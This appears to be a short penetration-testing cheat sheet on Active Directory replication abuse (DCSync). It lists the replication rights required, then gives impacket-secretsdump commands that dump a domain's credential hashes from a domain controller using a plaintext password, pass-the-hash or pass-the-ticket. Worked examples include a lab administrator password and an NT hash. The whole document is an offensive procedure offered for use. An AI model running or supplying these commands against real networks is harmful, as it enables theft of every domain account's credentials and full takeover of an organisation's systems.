# Replication abuse
## Prerequisites
- `DS-Replication-Get-Changes` (part of `GenericAll` on a Domain object)
- `DS-Replication-Get-Changes-All` (part of `GenericAll` on a Domain object)

## impacket-secretsdump

```bash
# using a plaintext password
impacket-secretsdump -outputfile $FILES_NAME "$DOMAIN"/"$USER":"$PASSWORD"@"$DOMAINCONTROLLER"
# impacket-secretsdump -outputfile contoso.dump 'CONTOSO.ORG'/'Administrator':'win2016-cli-P@$swd'@'192.168.68.64'

# with PTH (COMPUTERNAME$)
impacket-secretsdump -outputfile $FILES_NAME -hashes $LMHASH:$NTHASH $DOMAIN/"$USER"@"$DOMAINCONTROLLER"
# impacket-secretsdump -outputfile contoso.dump -hashes aad3b435b51404eeaad3b435b51404ee:d0773d3d8ae3a0f436b2b7e649faa137 'CONTOSO.ORG/WIN-NUU0DPB1BVC$@192.168.68.64'

# PTT
impacket-secretsdump -k -outputfile $FILES_NAME "$DOMAIN"/"$USER"@"$KDC_DNS_NAME"
# impacket-secretsdump -k -outputfile contoso.org.dump WIN-KML6TP4LOOL.contoso.org
```
